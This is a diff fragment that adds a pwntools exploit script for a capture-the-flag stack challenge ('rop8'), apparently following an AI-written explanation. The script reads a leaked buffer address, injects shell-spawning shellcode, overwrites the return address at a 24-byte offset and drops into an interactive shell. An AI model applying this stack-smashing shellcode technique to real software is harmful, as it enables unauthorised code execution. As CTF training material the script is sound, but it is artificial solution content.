@@ -104,3 +104,43 @@
  'When you run this script, it should give you an interactive shell where you '
  'can execute commands like `ls`, `cat`, etc., allowing you to read the flag '
  'or further interact with the system.')
+
+from pwn import *
+
+# Update context for the correct architecture
+context.update(arch='amd64', os='linux')
+
+# Start the vulnerable process
+io = process('./pwn/stack/rop-8/rop8')
+
+# Receive and print the welcome message
+welcome = io.recvline()
+print(welcome.decode())
+
+# Receive and print the line containing the buffer address
+buf_line = io.recvline()
+print(buf_line.decode())
+
+# Extract the address of buf from the output
+buf_address = int(buf_line.strip().split(b'[')[1].split(b']')[0], 16)
+print(f"Buffer address: {hex(buf_address)}")
+
+# Receive and print the prompt for input
+prompt = io.recvline()
+print(prompt.decode())
+
+# Generate shellcode to spawn a shell
+shellcode = asm(shellcraft.sh())
+
+# Calculate the offset to the return address (buf is 16 bytes, return address is 24 bytes from start of buf)
+offset = 24
+
+# Create the payload
+payload = shellcode.ljust(offset, b'A')  # Shellcode padded to reach the return address
+payload += p64(buf_address)              # Overwrite the return address with the address of buf
+
+# Send the payload to the program
+io.sendline(payload)
+
+# Interact with the shell
+io.interactive()
